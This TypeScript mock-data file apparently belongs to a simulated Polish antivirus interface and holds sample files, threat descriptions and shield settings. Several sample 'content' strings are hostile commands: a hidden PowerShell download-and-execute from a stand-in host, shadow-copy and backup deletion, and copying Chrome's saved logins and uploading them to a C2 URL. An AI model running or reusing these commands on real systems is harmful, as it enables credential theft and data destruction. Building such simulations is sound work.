import { FileItem, ProtectionShield } from '../types';

export const INITIAL_MOCK_FILES: FileItem[] = [
  {
    id: 'f1',
    name: 'kernel32.dll',
    path: 'C:\\Windows\\System32\\kernel32.dll',
    sizeKb: 4280,
    type: 'DLL',
    category: 'Library',
    hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    lastModified: '2026-06-12 10:22',
  },
  {
    id: 'f2',
    name: 'explorer.exe',
    path: 'C:\\Windows\\explorer.exe',
    sizeKb: 5120,
    type: 'EXE',
    category: 'Executable',
    hash: '7d793037a0760186574b0282f2f435e7',
    lastModified: '2026-07-01 14:15',
  },
  {
    id: 'f3',
    name: 'Faktura_FV2026_Pilne.pdf.exe',
    path: 'C:\\Users\\Użytkownik\\Pobrane\\Faktura_FV2026_Pilne.pdf.exe',
    sizeKb: 890,
    type: 'EXE (Double Extension)',
    category: 'Executable',
    hash: '8f2d1e0a811c76251b3a8d9f000122ff',
    lastModified: '2026-07-28 08:30',
    isKnownMalicious: true,
    defaultThreatDetails: {
      threatName: 'Trojan.Win32.Wieszka.Gen.A',
      threatType: 'Trojan',
      severity: 'Krytyczne',
      description: 'Złośliwy trojan podszywający się pod dokument PDF. Próbuje nawiązać połączenie z serwerem C2 i wykraść dane logowania.',
      riskScore: 98,
      indicators: [
        'Podwójne rozszerzenie .pdf.exe',
        'Nieweryfikowana sygnatura cyfrowa',
        'Ukryte dodawanie klucza do Autostartu (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)'
      ]
    },
    content: `REM Trojan Dropper Payload Simulation
Set WS = CreateObject("WScript.Shell")
WS.Run "cmd.exe /c powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://bad-server.evil/payload.ps1')", 0, False
`
  },
  {
    id: 'f4',
    name: 'win_system_patch_v2.ps1',
    path: 'C:\\Users\\Użytkownik\\AppData\\Local\\Temp\\win_system_patch_v2.ps1',
    sizeKb: 34,
    type: 'PowerShell Script',
    category: 'Script',
    hash: 'a11223344556677889900aabbccddeeff',
    lastModified: '2026-07-27 22:11',
    isKnownMalicious: true,
    defaultThreatDetails: {
      threatName: 'Ransomware.Cryptor.Wieszka.X',
      threatType: 'Ransomware',
      severity: 'Krytyczne',
      description: 'Głęboki skrypt PowerShell szyfrujący pliki użytkownika kluczem AES-256 i żądający okupu w kryptowalucie.',
      riskScore: 100,
      indicators: [
        'Szyfrowanie plików rozszerzeniami .wieszkalocked',
        'Usuwanie kopii zapasowych (vssadmin delete shadows /all /quiet)',
        'Wyłączenie usługi Windows Defender'
      ]
    },
    content: `# Wieszka Cryptor Payload
vssadmin.exe delete shadows /all /quiet
wbadmin DELETE SYSTEMSTATEBACKUP
Get-ChildItem -Path "C:\\Users\\" -Include *.docx,*.pdf,*.png,*.xlsx -Recurse | ForEach-Object {
    $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
    # Encrypt bytes with hardcoded AES key
    [System.IO.File]::WriteAllBytes($_.FullName + ".wieszkalocked", $bytes)
}
`
  },
  {
    id: 'f5',
    name: 'chrome_speed_booster.dll',
    path: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome_speed_booster.dll',
    sizeKb: 140,
    type: 'DLL',
    category: 'Library',
    hash: '556677889900aabbccddeeff11223344',
    lastModified: '2026-07-20 11:05',
    isKnownMalicious: true,
    defaultThreatDetails: {
      threatName: 'Adware.PUP.BrowserInjector',
      threatType: 'Adware',
      severity: 'Średnie',
      description: 'Potencjalnie niechciany program (PUP) wstrzykujący niezamówione reklamy i śledzący nawyki przeglądania.',
      riskScore: 65,
      indicators: [
        'Wstrzykiwanie kodów JavaScript do skrótów przeglądarki',
        'Zastępowanie strony głównej wyszukiwarką ad-tracker'
      ]
    },
    content: `// Browser Extension Injector
function injectAdScript() {
  var s = document.createElement('script');
  s.src = 'https://ad-network-tracking.xyz/inject.js';
  document.head.appendChild(s);
}
setInterval(injectAdScript, 5000);
`
  },
  {
    id: 'f6',
    name: 'svchost.exe',
    path: 'C:\\Windows\\System32\\svchost.exe',
    sizeKb: 120,
    type: 'EXE',
    category: 'System',
    hash: '3a123b456c789d012e345f6789a012b3',
    lastModified: '2026-05-10 12:00',
  },
  {
    id: 'f7',
    name: 'praca_dyplomowa_2026.docx',
    path: 'C:\\Users\\Użytkownik\\Dokumenty\\praca_dyplomowa_2026.docx',
    sizeKb: 2450,
    type: 'DOCX',
    category: 'Document',
    hash: '8899aaccbb1122334455667788990011',
    lastModified: '2026-07-26 19:40',
  },
  {
    id: 'f8',
    name: 'crypto_miner_svc.js',
    path: 'C:\\Users\\Użytkownik\\AppData\\Roaming\\Microsoft\\crypto_miner_svc.js',
    sizeKb: 78,
    type: 'JavaScript',
    category: 'Script',
    hash: '9900aabbccddeeff1122334455667788',
    lastModified: '2026-07-25 03:12',
    isKnownMalicious: true,
    defaultThreatDetails: {
      threatName: 'CoinMiner.JS.Monero.Gen',
      threatType: 'Spyware',
      severity: 'Wysokie',
      description: 'Ukryty kopacz kryptowaluty Monero wykorzystujący 100% zasobów procesora komputera.',
      riskScore: 88,
      indicators: [
        'Nawiązywanie połączenia z pulą wydobywczą stratum+tcp://pool.monero.org:3333',
        'Maksymalne obciążanie rdzeni CPU bez zgody użytkownika'
      ]
    },
    content: `const CoinHive = require('coinhive-miner');
(async () => {
  const miner = await CoinHive('XMR_WALLET_ADDRESS_SECRET', { threads: 8, throttle: 0 });
  miner.start();
})();
`
  },
  {
    id: 'f9',
    name: 'keylogger_driver.sys',
    path: 'C:\\Windows\\System32\\drivers\\keylogger_driver.sys',
    sizeKb: 310,
    type: 'SYS Driver',
    category: 'System',
    hash: 'feebda112233445566778899aabbccdd',
    lastModified: '2026-07-28 01:05',
    isKnownMalicious: true,
    defaultThreatDetails: {
      threatName: 'Spyware.KeyLogger.DriverHook',
      threatType: 'Keylogger',
      severity: 'Krytyczne',
      description: 'Sterownik jądra systemu przechwytujący każde naciśnięcie klawisza i hasła bankowe.',
      riskScore: 96,
      indicators: [
        'Klawiatura Hook API SetWindowsHookExW',
        'Zapis haseł do ukrytego pliku C:\\Windows\\temp\\keys.dat'
      ]
    },
    content: `// Kernel Keylogger Driver Code Snippet
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    HookKeyboardDriver();
    LogKeystrokesToFile("C:\\\\Windows\\\\temp\\\\keys.dat");
    return STATUS_SUCCESS;
}
`
  },
  {
    id: 'f10',
    name: 'zdjecie_wakacje_2026.jpg',
    path: 'C:\\Users\\Użytkownik\\Obrazy\\zdjecie_wakacje_2026.jpg',
    sizeKb: 3800,
    type: 'JPG Image',
    category: 'Document',
    hash: '112233445566778899aabbccddeeff00',
    lastModified: '2026-07-15 16:20',
  },
  {
    id: 'f_steam',
    name: 'Steam.exe',
    path: 'C:\\Program Files (x86)\\Steam\\Steam.exe',
    sizeKb: 18400,
    type: 'EXE',
    category: 'Executable',
    hash: '4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d',
    lastModified: '2026-07-20 12:00',
  },
  {
    id: 'f_discord',
    name: 'Discord.exe',
    path: 'C:\\Users\\Użytkownik\\AppData\\Local\\Discord\\Discord.exe',
    sizeKb: 94500,
    type: 'EXE',
    category: 'Executable',
    hash: '1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d',
    lastModified: '2026-07-22 18:30',
  },
  {
    id: 'f_huge65gb',
    name: 'Cyberpunk2077_Game_Master_65GB.exe',
    path: 'D:\\Gry\\Cyberpunk2077_Game_Master_65GB.exe',
    sizeKb: 68157440, // ~65 GB
    type: 'EXE (>50GB Archive)',
    category: 'Executable',
    hash: '9584736251433221100998877665544332211',
    lastModified: '2026-07-29 09:00',
  },
  {
    id: 'f11',
    name: 'WieszkaAntivirusSetup.exe',
    path: 'C:\\Pobrane\\WieszkaAntivirusSetup.exe',
    sizeKb: 45000,
    type: 'EXE',
    category: 'Executable',
    hash: '9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d',
    lastModified: '2026-07-28 04:00',
  },
  {
    id: 'f12',
    name: 'system_optimizer_crack.exe',
    path: 'C:\\Users\\Użytkownik\\Pobrane\\system_optimizer_crack.exe',
    sizeKb: 1850,
    type: 'Executable',
    category: 'Executable',
    hash: '778899aabbccddeeff00112233445566',
    lastModified: '2026-07-28 15:40',
    isKnownMalicious: true,
    defaultThreatDetails: {
      threatName: 'Malware.Win32.Stealer.Generic',
      threatType: 'Malware',
      severity: 'Krytyczne',
      description: 'Groźne oprogramowanie typu Malware (Infostealer) wykradające zapisane hasła z przeglądarek, tokeny sesji i portfele kryptowalutowe.',
      riskScore: 97,
      indicators: [
        'Kopiowanie i odczyt baz SQLite przeglądarki Chrome/Edge (Login Data)',
        'Złośliwe wyciąganie ciasteczek sesji HTTP oraz portfeli MetaMask',
        'Ukryte wysyłanie skradzionych haseł na serwer C2'
      ]
    },
    content: `REM Generic Stealer Malware Payload
cmd.exe /c copy "C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" "C:\\Temp\\stolen_logins.db"
powershell -Command "Invoke-WebRequest -Uri 'http://c2-malware-server.com/upload' -InFile 'C:\\Temp\\stolen_logins.db'"
`
  },
  {
    id: 'f13',
    name: 'CyberStealer_Trainer_v1.4.exe',
    path: 'D:\\Gry\\CyberStealer_Trainer_v1.4.exe',
    sizeKb: 3420,
    type: 'Executable',
    category: 'Executable',
    hash: 'ab12cd34ef56gh78ij90kl12mn34op56',
    lastModified: '2026-07-29 11:15',
    isKnownMalicious: true,
    defaultThreatDetails: {
      threatName: 'Trojan.GameHack.Stealer.D',
      threatType: 'Trojan',
      severity: 'Wysokie',
      description: 'Złośliwy "trainer" do gry na dysku D: modyfikujący pamięć i instalujący ukrytego trojana.',
      riskScore: 89,
      indicators: [
        'Próba wstrzyknięcia kodu DLL do procesu gry',
        'Zapisywanie logów do katalogu D:\\Temp\\keylog.dat'
      ]
    },
    content: `// Trojan Trainer on Drive D:
WriteMemoryProcess("game.exe", 0x7FFA120, 0x9090);
`
  },
  {
    id: 'f14',
    name: 'autorun.inf.exe',
    path: 'E:\\USB_Storage\\autorun.inf.exe',
    sizeKb: 920,
    type: 'Executable',
    category: 'Executable',
    hash: 'fffeee00112233445566778899aabbcc',
    lastModified: '2026-07-30 18:02',
    isKnownMalicious: true,
    defaultThreatDetails: {
      threatName: 'Worm.USB.AutoRun.E',
      threatType: 'Rootkit',
      severity: 'Krytyczne',
      description: 'Złośliwy robak na pamięci USB E: rozprzestrzeniający się automatycznie na zainfekowane komputery.',
      riskScore: 95,
      indicators: [
        'Tworzenie ukrytego pliku autorun.inf na nośnikach wymiennych USB',
        'Kopiowanie infekcji na każdy podłączony dysk pendrive'
      ]
    },
    content: `[autorun]
open=autorun.inf.exe
icon=autorun.inf.exe,0
`
  },
  {
    id: 'f15',
    name: 'Network_Ransomware_payload.vbs',
    path: 'F:\\NAS_Backup\\Network_Ransomware_payload.vbs',
    sizeKb: 112,
    type: 'VBScript',
    category: 'Script',
    hash: '11223344556677889900aabbccddeeff',
    lastModified: '2026-07-31 21:50',
    isKnownMalicious: true,
    defaultThreatDetails: {
      threatName: 'Ransomware.Network.ShareCrypt.F',
      threatType: 'Ransomware',
      severity: 'Krytyczne',
      description: 'Złośliwy skrypt na dysku sieciowym F: szyfrujący pliki kopii zapasowych w sieci lokalnej NAS.',
      riskScore: 99,
      indicators: [
        'Masowe szyfrowanie udziałów sieciowych SMB/CIFS',
        'Tworzenie instrukcji okupu READ_ME_DECRYPT.txt w folderach F:\\'
      ]
    },
    content: `' Network Share Ransomware Payload
Set fso = CreateObject("Scripting.FileSystemObject")
' Encrypt Network Drive files
`
  }
];

export const INITIAL_SHIELDS: ProtectionShield[] = [
  {
    id: 's1',
    name: 'File Shield',
    namePl: 'Ochrona Plików w Czasie Rzeczywistym',
    description: 'Skanuje każdy otwierany, modyfikowany lub pobierany plik na dysku w ułamku sekundy.',
    active: true,
    threatsBlockedToday: 14,
    iconName: 'ShieldAlert',
    sensitivity: 'Zalecana',
  },
  {
    id: 's2',
    name: 'Behavior Guard',
    namePl: 'Strażnik Behawioralny (Heurystyka)',
    description: 'Monitoruje procesy pod kątem podejrzanych zachowań (np. szyfrowanie, wstrzykiwanie pamięci).',
    active: true,
    threatsBlockedToday: 3,
    iconName: 'Activity',
    sensitivity: 'Maksymalna (AI)',
  },
  {
    id: 's3',
    name: 'Ransomware Shield',
    namePl: 'Ochrona Przed Ransomware i Szyfrowaniem',
    description: 'Blokuje nieautoryzowane próby modyfikacji dokumentów i zdjęć w folderach użytkownika.',
    active: true,
    threatsBlockedToday: 1,
    iconName: 'Lock',
    sensitivity: 'Zalecana',
  },
  {
    id: 's5',
    name: 'AI Deep Core Engine',
    namePl: 'Silnik Sztucznej Inteligencji Wieszka AI',
    description: 'Analizuje nieznane próbki w zaawansowanej chmurze Wieszka AI do natychmiastowego wykrywania zagrożeń typu Zero-Day.',
    active: true,
    threatsBlockedToday: 6,
    iconName: 'Cpu',
    sensitivity: 'Maksymalna (AI)',
  }
];
